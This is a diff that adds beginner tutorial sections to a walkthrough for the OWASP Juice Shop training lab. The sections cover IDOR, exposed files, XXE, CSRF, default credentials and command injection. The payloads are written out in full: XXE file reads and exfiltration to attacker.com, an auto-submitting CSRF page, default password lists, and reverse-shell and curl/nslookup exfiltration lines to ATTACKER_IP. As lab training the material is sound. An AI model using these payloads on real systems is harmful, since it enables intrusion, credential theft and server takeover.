@@ -892,6 +892,821 @@ for user in users['data']:
             </div>
         </div>
 
+        <!-- CHALLENGE 5: BROKEN ACCESS CONTROL -->
+        <div class="vulnerability-card">
+            <div class="vuln-header">
+                <h2 class="vuln-title">🔓 Challenge 5: Admin Access Without Authorization</h2>
+                <span class="severity severity-critical">CRITICAL SEVERITY</span>
+            </div>
+
+            <h3>What is Broken Access Control?</h3>
+            <div class="info-box">
+                <strong>💡 Access Control Explained</strong>
+                <p style="margin: 10px 0 0 0;">
+                    Access control = who can access what. Think of it like building security:
+                </p>
+                <ul style="margin: 10px 0 0 20px;">
+                    <li><strong>Authentication</strong> - Proves who you are (ID badge)</li>
+                    <li><strong>Authorization</strong> - Determines what you can access (badge says "Floor 3 only")</li>
+                </ul>
+                <p style="margin: 10px 0 0 0;">
+                    Broken access control means you can access things you shouldn't - like a Floor 3 badge working on Floor 10!
+                </p>
+            </div>
+
+            <h3>Finding the Admin Panel</h3>
+            <ol class="steps">
+                <li>
+                    <strong>Look for Hidden Links</strong><br>
+                    Admin pages aren't linked anywhere visible, but they exist! Try guessing URLs:
+                    <pre style="margin: 10px 0;"><code>http://localhost:3000/admin
+http://localhost:3000/administration
+http://localhost:3000/#/admin
+http://localhost:3000/#/administration</code></pre>
+                </li>
+                <li>
+                    <strong>Check JavaScript Files</strong><br>
+                    Admin routes are often defined in frontend code. Open DevTools → Sources → main.js<br>
+                    Search for: <code>admin</code> or <code>path:</code>
+                </li>
+                <li>
+                    <strong>Access the Admin Panel</strong><br>
+                    Navigate to: <code>http://localhost:3000/#/administration</code><br>
+                    You'll see user management, even as a regular user!
+                </li>
+            </ol>
+
+            <h3>Exploiting Broken Authorization</h3>
+            <p>Once you find the admin panel, try these attacks:</p>
+
+            <div class="grid">
+                <div class="grid-item">
+                    <h4>View All Users</h4>
+                    <pre style="font-size: 0.85em;"><code>GET /api/Users
+# Returns ALL user accounts</code></pre>
+                </div>
+                <div class="grid-item">
+                    <h4>Delete Any User</h4>
+                    <pre style="font-size: 0.85em;"><code>DELETE /api/Users/2
+# Deletes user with ID 2</code></pre>
+                </div>
+                <div class="grid-item">
+                    <h4>Access Others' Baskets</h4>
+                    <pre style="font-size: 0.85em;"><code>GET /api/Baskets/3
+# See another user's cart</code></pre>
+                </div>
+                <div class="grid-item">
+                    <h4>Read Private Data</h4>
+                    <pre style="font-size: 0.85em;"><code>GET /api/Users/1
+# Get user details/emails</code></pre>
+                </div>
+            </div>
+
+            <h3>IDOR (Insecure Direct Object Reference)</h3>
+            <div class="info-box">
+                <strong>💡 What is IDOR?</strong>
+                <p style="margin: 10px 0 0 0;">
+                    IDOR = changing IDs in URLs/requests to access other users' data. Example:
+                </p>
+                <pre style="margin: 10px 0 0 0;"><code><span class="comment"># Your profile</span>
+GET /api/Users/5
+
+<span class="comment"># Just change the number!</span>
+GET /api/Users/1  <span class="comment"># Admin's profile</span>
+GET /api/Users/2  <span class="comment"># Another user's profile</span></code></pre>
+            </div>
+
+            <h3>Testing for IDOR</h3>
+            <ol class="steps">
+                <li>
+                    <strong>Find Your User ID</strong><br>
+                    Open DevTools → Application → Local Storage<br>
+                    Look for: <code>bid</code> (basket ID) or user token
+                </li>
+                <li>
+                    <strong>Access Your Basket</strong><br>
+                    <code>http://localhost:3000/api/Baskets/5</code> (your ID)
+                </li>
+                <li>
+                    <strong>Try Other IDs</strong><br>
+                    <code>http://localhost:3000/api/Baskets/1</code><br>
+                    <code>http://localhost:3000/api/Baskets/2</code><br>
+                    If you see others' items, it's IDOR!
+                </li>
+            </ol>
+
+            <div class="success-box">
+                <strong>✅ What You Learned</strong>
+                <ul style="margin: 10px 0 0 0;">
+                    <li>Difference between authentication and authorization</li>
+                    <li>How to discover hidden admin panels</li>
+                    <li>What IDOR vulnerabilities are</li>
+                    <li>Testing sequential IDs for access control flaws</li>
+                    <li>Real-world impact of broken access control</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- CHALLENGE 6: SENSITIVE DATA EXPOSURE -->
+        <div class="vulnerability-card">
+            <div class="vuln-header">
+                <h2 class="vuln-title">📄 Challenge 6: Confidential Document Discovery</h2>
+                <span class="severity severity-high">HIGH SEVERITY</span>
+            </div>
+
+            <h3>What is Sensitive Data Exposure?</h3>
+            <div class="info-box">
+                <strong>💡 Simple Explanation</strong>
+                <p style="margin: 10px 0 0 0;">
+                    Imagine leaving your diary on the kitchen table instead of locking it in your room. 
+                    Sensitive data exposure = storing confidential files where anyone can find them!
+                </p>
+                <p style="margin: 10px 0 0 0;">
+                    Examples: Database backups in <code>/public/</code>, API keys in JavaScript, 
+                    config files accessible via web browser.
+                </p>
+            </div>
+
+            <h3>Finding Hidden Files</h3>
+            <ol class="steps">
+                <li>
+                    <strong>Check Common Directories</strong><br>
+                    Try these URLs in your browser:
+                    <pre style="margin: 10px 0;"><code>http://localhost:3000/ftp
+http://localhost:3000/backup
+http://localhost:3000/uploads
+http://localhost:3000/assets
+http://localhost:3000/public</code></pre>
+                </li>
+                <li>
+                    <strong>Look for Directory Listings</strong><br>
+                    If you see a list of files (instead of a 404), that's directory browsing!
+                </li>
+                <li>
+                    <strong>Download Interesting Files</strong><br>
+                    Look for: <code>.pdf</code>, <code>.txt</code>, <code>.bak</code>, <code>.zip</code>, <code>.sql</code>
+                </li>
+            </ol>
+
+            <h3>The FTP Directory</h3>
+            <p>
+                Navigate to: <code>http://localhost:3000/ftp</code><br>
+                You'll find confidential files like:
+            </p>
+
+            <div class="grid">
+                <div class="grid-item">
+                    <h4>📋 acquisitions.md</h4>
+                    <p style="font-size: 0.9em;">Business acquisition plans</p>
+                </div>
+                <div class="grid-item">
+                    <h4>📜 legal.md</h4>
+                    <p style="font-size: 0.9em;">Legal documents and ToS</p>
+                </div>
+                <div class="grid-item">
+                    <h4>🗂️ package.json.bak</h4>
+                    <p style="font-size: 0.9em;">Backup with dependencies/versions</p>
+                </div>
+                <div class="grid-item">
+                    <h4>🔧 coupons_2013.md.bak</h4>
+                    <p style="font-size: 0.9em;">Old coupon codes (might still work!)</p>
+                </div>
+            </div>
+
+            <h3>Using Automated Tools</h3>
+            <p>Use tools like <strong>dirb</strong> or <strong>gobuster</strong> to find hidden directories automatically:</p>
+
+            <pre><code><span class="comment"># dirb (simple directory brute-forcer)</span>
+<span class="command">dirb http://localhost:3000 /usr/share/wordlists/dirb/common.txt</span>
+
+<span class="comment"># gobuster (faster, more options)</span>
+<span class="command">gobuster dir -u http://localhost:3000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>
+
+<span class="comment"># nikto (comprehensive web scanner)</span>
+<span class="command">nikto -h http://localhost:3000</span></code></pre>
+
+            <h3>Finding Secrets in JavaScript</h3>
+            <ol class="steps">
+                <li>
+                    <strong>View Page Source</strong><br>
+                    Right-click → View Page Source
+                </li>
+                <li>
+                    <strong>Check All .js Files</strong><br>
+                    Look for <code>&lt;script src="main.js"&gt;</code> tags
+                </li>
+                <li>
+                    <strong>Search for Keywords</strong><br>
+                    Use Ctrl+F to find: <code>password</code>, <code>api_key</code>, <code>secret</code>, <code>token</code>, <code>admin</code>
+                </li>
+            </ol>
+
+            <div class="danger-box">
+                <strong>🔥 Real-World Examples</strong>
+                <ul style="margin: 10px 0 0 20px;">
+                    <li><strong>AWS Keys in GitHub</strong> - Attackers scan public repos for accidentally committed keys</li>
+                    <li><strong>Database Backups in /backups/</strong> - Download entire user database with passwords</li>
+                    <li><strong>.git Folder Exposed</strong> - Download complete source code via <code>/.git/</code></li>
+                    <li><strong>Environment Files</strong> - <code>.env</code> files contain passwords, API keys, database credentials</li>
+                </ul>
+            </div>
+
+            <div class="success-box">
+                <strong>✅ What You Learned</strong>
+                <ul style="margin: 10px 0 0 0;">
+                    <li>What sensitive data exposure is</li>
+                    <li>Common directories attackers check</li>
+                    <li>How to use dirb, gobuster, nikto</li>
+                    <li>Finding secrets in client-side JavaScript</li>
+                    <li>Why directory listings are dangerous</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- CHALLENGE 7: XXE (XML EXTERNAL ENTITY) -->
+        <div class="vulnerability-card">
+            <div class="vuln-header">
+                <h2 class="vuln-title">📦 Challenge 7: XML External Entity (XXE) Attack</h2>
+                <span class="severity severity-high">HIGH SEVERITY</span>
+            </div>
+
+            <h3>What is XXE?</h3>
+            <div class="info-box">
+                <strong>💡 XXE Explained Simply</strong>
+                <p style="margin: 10px 0 0 0;">
+                    XML = a way to structure data (like JSON). XXE exploits XML parsers to:
+                </p>
+                <ul style="margin: 10px 0 0 20px;">
+                    <li>Read local files (like <code>/etc/passwd</code>)</li>
+                    <li>Execute server-side code</li>
+                    <li>Scan internal networks</li>
+                    <li>Cause denial of service</li>
+                </ul>
+                <p style="margin: 10px 0 0 0;">
+                    Think: "What if I could tell the server to read its own files and send them to me?"
+                </p>
+            </div>
+
+            <h3>Finding XML Endpoints</h3>
+            <ol class="steps">
+                <li>
+                    <strong>Look for File Upload Features</strong><br>
+                    Juice Shop has a "Complain" feature that accepts file uploads
+                </li>
+                <li>
+                    <strong>Check What File Types Are Accepted</strong><br>
+                    Try uploading: <code>.pdf</code>, <code>.zip</code>, <code>.xml</code>
+                </li>
+                <li>
+                    <strong>Create a Malicious XML File</strong><br>
+                    We'll craft XML that reads server files!
+                </li>
+            </ol>
+
+            <h3>The XXE Exploit</h3>
+            <p>Create a file called <code>xxe.xml</code> with this content:</p>
+
+            <pre><code><span class="comment">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="comment">&lt;!-- Define an external entity that reads /etc/passwd --&gt;</span>
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+
+<span class="comment">&lt;!-- Reference the entity in the XML --&gt;</span>
+&lt;complaint&gt;
+  &lt;message&gt;&amp;xxe;&lt;/message&gt;
+&lt;/complaint&gt;</code></pre>
+
+            <h3>How It Works</h3>
+            <ol class="steps">
+                <li>
+                    <strong>Define External Entity</strong><br>
+                    <code>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</code><br>
+                    This creates a variable <code>xxe</code> that contains the contents of <code>/etc/passwd</code>
+                </li>
+                <li>
+                    <strong>Reference the Entity</strong><br>
+                    <code>&amp;xxe;</code> - This gets replaced with the file contents!
+                </li>
+                <li>
+                    <strong>Server Processes It</strong><br>
+                    The XML parser reads the file and includes it in the response
+                </li>
+            </ol>
+
+            <h3>Advanced XXE Techniques</h3>
+
+            <div class="grid">
+                <div class="grid-item">
+                    <h4>🔍 Read System Files</h4>
+                    <pre style="font-size: 0.8em;"><code>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY xxe SYSTEM "file:///etc/hosts"&gt;
+&lt;!ENTITY xxe SYSTEM "file:///var/log/apache2/access.log"&gt;</code></pre>
+                </div>
+                <div class="grid-item">
+                    <h4>🌐 SSRF via XXE</h4>
+                    <pre style="font-size: 0.8em;"><code>&lt;!ENTITY xxe SYSTEM "http://internal-server/admin"&gt;
+&lt;!ENTITY xxe SYSTEM "http://localhost:8080/admin"&gt;</code></pre>
+                </div>
+                <div class="grid-item">
+                    <h4>💣 Denial of Service</h4>
+                    <pre style="font-size: 0.8em;"><code>&lt;!ENTITY lol "lol"&gt;
+&lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;"&gt;
+&lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;"&gt;
+<span class="comment">&lt;!-- Billion Laughs Attack --&gt;</span></code></pre>
+                </div>
+                <div class="grid-item">
+                    <h4>📤 Data Exfiltration</h4>
+                    <pre style="font-size: 0.8em;"><code>&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"&gt;
+%dtd;</code></pre>
+                </div>
+            </div>
+
+            <h3>Testing in Juice Shop</h3>
+            <ol class="steps">
+                <li>Go to: <strong>Contact Us</strong> or <strong>Complain</strong> page</li>
+                <li>Fill out the form</li>
+                <li>Upload your <code>xxe.xml</code> file</li>
+                <li>Submit and check the response for file contents</li>
+            </ol>
+
+            <div class="danger-box">
+                <strong>🔥 Real-World Impact</strong>
+                <ul style="margin: 10px 0 0 20px;">
+                    <li>Read server configuration files (database passwords!)</li>
+                    <li>Access internal network resources (SSRF)</li>
+                    <li>Execute remote code via PHP wrappers</li>
+                    <li>Steal AWS credentials from metadata service</li>
+                </ul>
+            </div>
+
+            <div class="success-box">
+                <strong>✅ What You Learned</strong>
+                <ul style="margin: 10px 0 0 0;">
+                    <li>What XML and XXE vulnerabilities are</li>
+                    <li>How external entities work</li>
+                    <li>Reading server files via XXE</li>
+                    <li>Billion Laughs DoS attack</li>
+                    <li>Why XML parsers need to be configured securely</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- CHALLENGE 8: CSRF (Cross-Site Request Forgery) -->
+        <div class="vulnerability-card">
+            <div class="vuln-header">
+                <h2 class="vuln-title">🎭 Challenge 8: Cross-Site Request Forgery (CSRF)</h2>
+                <span class="severity severity-medium">MEDIUM SEVERITY</span>
+            </div>
+
+            <h3>What is CSRF?</h3>
+            <div class="info-box">
+                <strong>💡 CSRF Explained with a Story</strong>
+                <p style="margin: 10px 0 0 0;">
+                    You're logged into your bank. An attacker sends you an email with an image:
+                </p>
+                <pre style="margin: 10px 0;"><code>&lt;img src="https://bank.com/transfer?to=attacker&amount=1000"&gt;</code></pre>
+                <p style="margin: 10px 0 0 0;">
+                    When your browser loads the image, it sends a request to your bank - and since you're 
+                    logged in, the bank thinks YOU authorized the transfer!
+                </p>
+                <p style="margin: 10px 0 0 0;">
+                    CSRF = tricking your browser into making requests you didn't intend.
+                </p>
+            </div>
+
+            <h3>How CSRF Works</h3>
+            <ol class="steps">
+                <li>
+                    <strong>Victim Logs Into Target Site</strong><br>
+                    You log into Juice Shop → browser stores session cookie
+                </li>
+                <li>
+                    <strong>Attacker Crafts Malicious Page</strong><br>
+                    Creates HTML that makes requests to Juice Shop
+                </li>
+                <li>
+                    <strong>Victim Visits Attacker's Page</strong><br>
+                    Could be via email link, forum post, etc.
+                </li>
+                <li>
+                    <strong>Browser Automatically Sends Cookies</strong><br>
+                    Your browser includes your Juice Shop session cookie in the request!
+                </li>
+            </ol>
+
+            <h3>Crafting a CSRF Attack</h3>
+            <p>Create an HTML file called <code>csrf.html</code>:</p>
+
+            <pre><code>&lt;html&gt;
+  &lt;body&gt;
+    &lt;h1&gt;You Won a Prize!&lt;/h1&gt;
+    &lt;p&gt;Click below to claim:&lt;/p&gt;
+    
+    <span class="comment">&lt;!-- Hidden form that changes victim's email --&gt;</span>
+    &lt;form id="csrf" action="http://localhost:3000/api/Users/1" method="POST"&gt;
+      &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
+    &lt;/form&gt;
+    
+    <span class="comment">&lt;!-- Auto-submit form when page loads --&gt;</span>
+    &lt;script&gt;
+      document.getElementById('csrf').submit();
+    &lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+
+            <h3>Testing CSRF in Juice Shop</h3>
+            <ol class="steps">
+                <li>
+                    <strong>Log Into Juice Shop</strong><br>
+                    Open: <code>http://localhost:3000</code> and log in
+                </li>
+                <li>
+                    <strong>Open Your csrf.html File</strong><br>
+                    In a different tab, open your malicious HTML file
+                </li>
+                <li>
+                    <strong>Check What Happened</strong><br>
+                    Go back to Juice Shop → Check your profile<br>
+                    Your email may have changed!
+                </li>
+            </ol>
+
+            <h3>Advanced CSRF Techniques</h3>
+
+            <div class="grid">
+                <div class="grid-item">
+                    <h4>💸 Money Transfer</h4>
+                    <pre style="font-size: 0.8em;"><code>&lt;img src="http://bank.com/transfer?to=attacker&amount=1000"&gt;</code></pre>
+                </div>
+                <div class="grid-item">
+                    <h4>✉️ Change Email</h4>
+                    <pre style="font-size: 0.8em;"><code>&lt;form action="/update-email" method="POST"&gt;
+  &lt;input name="email" value="evil@attacker.com"&gt;
+&lt;/form&gt;</code></pre>
+                </div>
+                <div class="grid-item">
+                    <h4>🔐 Change Password</h4>
+                    <pre style="font-size: 0.8em;"><code>&lt;form action="/change-password" method="POST"&gt;
+  &lt;input name="new_password" value="hacked123"&gt;
+&lt;/form&gt;</code></pre>
+                </div>
+                <div class="grid-item">
+                    <h4>🛒 Add Items to Cart</h4>
+                    <pre style="font-size: 0.8em;"><code>&lt;img src="http://shop.com/cart/add?item=expensive_item"&gt;</code></pre>
+                </div>
+            </div>
+
+            <h3>Bypassing CSRF Protections</h3>
+
+            <div class="info-box">
+                <strong>🛡️ Common Protections & Bypasses</strong>
+                <ol style="margin: 10px 0 0 20px;">
+                    <li>
+                        <strong>CSRF Tokens</strong> - Random tokens in forms
+                        <ul>
+                            <li><em>Bypass:</em> Leak token via XSS, check if token is validated</li>
+                        </ul>
+                    </li>
+                    <li>
+                        <strong>SameSite Cookies</strong> - Cookies only sent from same origin
+                        <ul>
+                            <li><em>Bypass:</em> Only works if implemented correctly (many aren't)</li>
+                        </ul>
+                    </li>
+                    <li>
+                        <strong>Referer Header Check</strong> - Validates where request came from
+                        <ul>
+                            <li><em>Bypass:</em> Use <code>&lt;meta name="referrer" content="no-referrer"&gt;</code></li>
+                        </ul>
+                    </li>
+                </ol>
+            </div>
+
+            <div class="success-box">
+                <strong>✅ What You Learned</strong>
+                <ul style="margin: 10px 0 0 0;">
+                    <li>What CSRF attacks are and how they work</li>
+                    <li>Why browsers auto-include cookies</li>
+                    <li>Creating malicious HTML to exploit CSRF</li>
+                    <li>Common CSRF protections and bypasses</li>
+                    <li>Real-world CSRF attack scenarios</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- CHALLENGE 9: SECURITY MISCONFIGURATION -->
+        <div class="vulnerability-card">
+            <div class="vuln-header">
+                <h2 class="vuln-title">⚙️ Challenge 9: Error Handling & Debug Info Leakage</h2>
+                <span class="severity severity-medium">MEDIUM SEVERITY</span>
+            </div>
+
+            <h3>What is Security Misconfiguration?</h3>
+            <div class="info-box">
+                <strong>💡 Simple Explanation</strong>
+                <p style="margin: 10px 0 0 0;">
+                    Security misconfiguration = leaving default settings, showing too much error info, 
+                    or not hardening your server. Examples:
+                </p>
+                <ul style="margin: 10px 0 0 20px;">
+                    <li>Default admin passwords (<code>admin/admin</code>)</li>
+                    <li>Debug mode enabled in production</li>
+                    <li>Detailed error messages revealing stack traces</li>
+                    <li>Unnecessary services running</li>
+                    <li>Directory listings enabled</li>
+                </ul>
+            </div>
+
+            <h3>Finding Misconfigurations in Juice Shop</h3>
+
+            <div class="grid">
+                <div class="grid-item">
+                    <h4>1️⃣ Verbose Errors</h4>
+                    <p style="font-size: 0.9em;">Trigger errors to see stack traces:</p>
+                    <pre style="font-size: 0.8em; margin: 5px 0 0 0;"><code>http://localhost:3000/api/Products/999999
+<span class="comment"># Returns full SQL query!</span></code></pre>
+                </div>
+                <div class="grid-item">
+                    <h4>2️⃣ Exposed APIs</h4>
+                    <p style="font-size: 0.9em;">APIs without authentication:</p>
+                    <pre style="font-size: 0.8em; margin: 5px 0 0 0;"><code>/api/Users
+/api/Challenges
+/rest/admin/application-version</code></pre>
+                </div>
+                <div class="grid-item">
+                    <h4>3️⃣ Debug Endpoints</h4>
+                    <p style="font-size: 0.9em;">Left enabled in production:</p>
+                    <pre style="font-size: 0.8em; margin: 5px 0 0 0;"><code>/api/debug
+/api/server-info
+/metrics</code></pre>
+                </div>
+                <div class="grid-item">
+                    <h4>4️⃣ Package Info</h4>
+                    <p style="font-size: 0.9em;">Version disclosure:</p>
+                    <pre style="font-size: 0.8em; margin: 5px 0 0 0;"><code>/package.json
+/composer.json
+/bower.json</code></pre>
+                </div>
+            </div>
+
+            <h3>Exploiting Verbose Errors</h3>
+            <ol class="steps">
+                <li>
+                    <strong>Cause an Error</strong><br>
+                    Try invalid input: <code>http://localhost:3000/api/Products/INVALID</code>
+                </li>
+                <li>
+                    <strong>Read the Stack Trace</strong><br>
+                    Error messages reveal:
+                    <ul>
+                        <li>Database type (MySQL, PostgreSQL, SQLite)</li>
+                        <li>Server paths (<code>/app/server/routes/</code>)</li>
+                        <li>Framework version (Express, Sequelize)</li>
+                        <li>Dependency versions</li>
+                    </ul>
+                </li>
+                <li>
+                    <strong>Use This Info for Targeted Attacks</strong><br>
+                    Search for exploits specific to those versions!
+                </li>
+            </ol>
+
+            <h3>Default Credentials</h3>
+            <p>Try common default logins:</p>
+
+            <div class="grid">
+                <div class="grid-item">
+                    <h4>Admin Accounts</h4>
+                    <pre style="font-size: 0.85em;"><code>admin / admin
+administrator / password
+admin / password123
+root / root</code></pre>
+                </div>
+                <div class="grid-item">
+                    <h4>Database Defaults</h4>
+                    <pre style="font-size: 0.85em;"><code>postgres / postgres
+mysql / mysql
+root / (empty)
+sa / (empty)</code></pre>
+                </div>
+                <div class="grid-item">
+                    <h4>Service Accounts</h4>
+                    <pre style="font-size: 0.85em;"><code>test / test
+guest / guest
+demo / demo
+user / user</code></pre>
+                </div>
+                <div class="grid-item">
+                    <h4>Application Specific</h4>
+                    <pre style="font-size: 0.85em;"><code>tomcat / tomcat
+oracle / oracle
+weblogic / weblogic1</code></pre>
+                </div>
+            </div>
+
+            <h3>Finding Version Information</h3>
+            <pre><code><span class="comment"># Check HTTP headers</span>
+<span class="command">curl -I http://localhost:3000</span>
+<span class="output">Server: nginx/1.18.0
+X-Powered-By: Express</span>
+
+<span class="comment"># Check JavaScript files</span>
+<span class="command">curl http://localhost:3000/main.js | grep -i "version"</span>
+
+<span class="comment"># Check robots.txt (often reveals structure)</span>
+<span class="command">curl http://localhost:3000/robots.txt</span></code></pre>
+
+            <div class="danger-box">
+                <strong>🔥 Real-World Examples</strong>
+                <ul style="margin: 10px 0 0 20px;">
+                    <li><strong>Equifax Breach</strong> - Unpatched Apache Struts (known vulnerable version)</li>
+                    <li><strong>MongoDB Ransomware</strong> - 30,000+ databases with default settings (no password!)</li>
+                    <li><strong>Elasticsearch Leaks</strong> - Open to internet with no authentication</li>
+                    <li><strong>AWS S3 Buckets</strong> - Public read/write permissions</li>
+                </ul>
+            </div>
+
+            <div class="success-box">
+                <strong>✅ What You Learned</strong>
+                <ul style="margin: 10px 0 0 0;">
+                    <li>What security misconfiguration means</li>
+                    <li>How error messages leak sensitive info</li>
+                    <li>Common default credentials to test</li>
+                    <li>Finding version info for exploit research</li>
+                    <li>Why hardening servers is critical</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- CHALLENGE 10: COMMAND INJECTION -->
+        <div class="vulnerability-card">
+            <div class="vuln-header">
+                <h2 class="vuln-title">💻 Challenge 10: OS Command Injection</h2>
+                <span class="severity severity-critical">CRITICAL SEVERITY</span>
+            </div>
+
+            <h3>What is Command Injection?</h3>
+            <div class="info-box">
+                <strong>💡 Command Injection Explained</strong>
+                <p style="margin: 10px 0 0 0;">
+                    Imagine a website that lets you "ping" servers. Internally, it runs:
+                </p>
+                <pre style="margin: 10px 0;"><code>os.system("ping " + user_input)</code></pre>
+                <p style="margin: 10px 0 0 0;">
+                    What if you enter: <code>google.com; whoami</code>?
+                </p>
+                <p style="margin: 10px 0 0 0;">
+                    The server runs: <code>ping google.com; whoami</code><br>
+                    The semicolon (;) means "run next command" - so it runs <code>whoami</code> after <code>ping</code>!
+                </p>
+            </div>
+
+            <h3>Command Injection Characters</h3>
+            <div class="grid">
+                <div class="grid-item">
+                    <h4>Unix/Linux</h4>
+                    <pre style="font-size: 0.85em;"><code>;   <span class="comment"># Semicolon - run next command</span>
+&   <span class="comment"># Ampersand - run in background</span>
+|   <span class="comment"># Pipe - send output to next command</span>
+&&  <span class="comment"># AND - run if first succeeds</span>
+||  <span class="comment"># OR - run if first fails</span>
+`   <span class="comment"># Backticks - command substitution</span>
+$()</span> <span class="comment"># Command substitution (modern)</span></code></pre>
+                </div>
+                <div class="grid-item">
+                    <h4>Windows</h4>
+                    <pre style="font-size: 0.85em;"><code>&   <span class="comment"># Run next command</span>
+|   <span class="comment"># Pipe output</span>
+&&  <span class="comment"># AND operator</span>
+||  <span class="comment"># OR operator</span>
+^   <span class="comment"># Escape character</span></code></pre>
+                </div>
+            </div>
+
+            <h3>Finding Command Injection in Juice Shop</h3>
+            <ol class="steps">
+                <li>
+                    <strong>Look for User Input That Runs System Commands</strong><br>
+                    Common places:
+                    <ul>
+                        <li>File upload/processing features</li>
+                        <li>Image conversion tools</li>
+                        <li>Network diagnostic tools (ping, traceroute)</li>
+                        <li>Search functionality</li>
+                    </ul>
+                </li>
+                <li>
+                    <strong>Test Basic Injection</strong><br>
+                    Try these payloads:
+                    <pre style="margin: 10px 0;"><code>; whoami
+; pwd
+; ls
+; cat /etc/passwd</code></pre>
+                </li>
+                <li>
+                    <strong>Look for Command Output</strong><br>
+                    If you see system command results in the response, you've got command injection!
+                </li>
+            </ol>
+
+            <h3>Exploitation Examples</h3>
+
+            <div class="grid">
+                <div class="grid-item">
+                    <h4>🔍 Information Gathering</h4>
+                    <pre style="font-size: 0.8em;"><code>; whoami
+; id
+; uname -a
+; cat /etc/passwd
+; env</code></pre>
+                </div>
+                <div class="grid-item">
+                    <h4>📂 File System Access</h4>
+                    <pre style="font-size: 0.8em;"><code>; ls -la /
+; find / -name "*.txt"
+; cat /app/config.js
+; cat /var/log/apache2/access.log</code></pre>
+                </div>
+                <div class="grid-item">
+                    <h4>🌐 Network Recon</h4>
+                    <pre style="font-size: 0.8em;"><code>; ifconfig
+; netstat -an
+; arp -a
+; route</code></pre>
+                </div>
+                <div class="grid-item">
+                    <h4>🚪 Reverse Shell</h4>
+                    <pre style="font-size: 0.8em;"><code>; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+; nc -e /bin/bash ATTACKER_IP 4444</code></pre>
+                </div>
+            </div>
+
+            <h3>Advanced: Blind Command Injection</h3>
+            <p>Sometimes you don't see output directly. Use these techniques:</p>
+
+            <div class="info-box">
+                <strong>🎯 Blind Injection Techniques</strong>
+                <ol style="margin: 10px 0 0 20px;">
+                    <li>
+                        <strong>Time-Based</strong>
+                        <pre style="margin: 5px 0 0 0;"><code>; sleep 10
+; ping -c 10 127.0.0.1</code></pre>
+                        If the response is delayed, command executed!
+                    </li>
+                    <li>
+                        <strong>DNS Exfiltration</strong>
+                        <pre style="margin: 5px 0 0 0;"><code>; nslookup $(whoami).attacker.com
+; curl http://attacker.com/$(whoami)</code></pre>
+                        Data sent via DNS or HTTP requests
+                    </li>
+                    <li>
+                        <strong>File Writing</strong>
+                        <pre style="margin: 5px 0 0 0;"><code>; whoami > /var/www/html/output.txt
+<span class="comment"># Then visit: http://site.com/output.txt</span></code></pre>
+                    </li>
+                </ol>
+            </div>
+
+            <h3>Full Exploitation: Getting a Shell</h3>
+            <ol class="steps">
+                <li>
+                    <strong>Set Up Listener on Your Machine</strong><br>
+                    <pre style="margin: 10px 0;"><code>nc -lvnp 4444</code></pre>
+                </li>
+                <li>
+                    <strong>Inject Reverse Shell Command</strong><br>
+                    <pre style="margin: 10px 0;"><code>; bash -i >& /dev/tcp/YOUR_IP/4444 0>&1</code></pre>
+                </li>
+                <li>
+                    <strong>You Now Have a Shell!</strong><br>
+                    Full control over the server
+                </li>
+            </ol>
+
+            <div class="danger-box">
+                <strong>🔥 Real-World Impact</strong>
+                <ul style="margin: 10px 0 0 20px;">
+                    <li><strong>Full Server Compromise</strong> - Attacker gains shell access</li>
+                    <li><strong>Data Exfiltration</strong> - Steal databases, source code, credentials</li>
+                    <li><strong>Lateral Movement</strong> - Use compromised server to attack internal network</li>
+                    <li><strong>Ransomware Deployment</strong> - Encrypt files and demand payment</li>
+                </ul>
+            </div>
+
+            <div class="success-box">
+                <strong>✅ What You Learned</strong>
+                <ul style="margin: 10px 0 0 0;">
+                    <li>What command injection is and why it's critical</li>
+                    <li>Command injection characters (; | & && ||)</li>
+                    <li>Finding injection points in web apps</li>
+                    <li>Blind injection techniques</li>
+                    <li>Getting reverse shells via command injection</li>
+                </ul>
+            </div>
+        </div>
+
         <!-- PRO TIPS -->
         <div class="section">
             <h2>🎓 Pro Tips for Juice Shop</h2>
@@ -931,12 +1746,337 @@ for user in users['data']:
 
             <h3>Recommended Learning Path</h3>
             <ol class="steps">
-                <li><strong>Easy Challenges First</strong> - Build confidence with simple exploits</li>
+                <li><strong>Easy Challenges First</strong> - Build confidence with simple exploits (Challenges 1-4)</li>
                 <li><strong>Learn One Vulnerability Type at a Time</strong> - Master SQL injection before moving to XSS</li>
+                <li><strong>Progress to Medium Challenges</strong> - CSRF, XXE, Security Misconfiguration (Challenges 5-9)</li>
                 <li><strong>Read Code When Available</strong> - Juice Shop is open source on GitHub!</li>
                 <li><strong>Automate Exploits</strong> - Write Python scripts to practice coding skills</li>
-                <li><strong>Try Advanced Challenges</strong> - SSRF, XXE, Deserialization attacks</li>
+                <li><strong>Try Advanced Challenges</strong> - Command injection, cryptography, business logic flaws</li>
+                <li><strong>Complete ALL Categories</strong> - Aim for 100% completion across all OWASP types</li>
             </ol>
+
+            <h3>More Challenges to Explore</h3>
+            <p>Juice Shop has 100+ challenges across these categories:</p>
+
+            <div class="grid">
+                <div class="grid-item">
+                    <h4>🔐 Broken Authentication</h4>
+                    <ul style="font-size: 0.9em; margin: 10px 0 0 20px;">
+                        <li>JWT token manipulation</li>
+                        <li>Password reset bypass</li>
+                        <li>OAuth flaws</li>
+                        <li>Session fixation</li>
+                    </ul>
+                </div>
+                <div class="grid-item">
+                    <h4>🔓 Broken Access Control</h4>
+                    <ul style="font-size: 0.9em; margin: 10px 0 0 20px;">
+                        <li>Horizontal privilege escalation</li>
+                        <li>Vertical privilege escalation</li>
+                        <li>IDOR (changing IDs)</li>
+                        <li>Accessing admin functions</li>
+                    </ul>
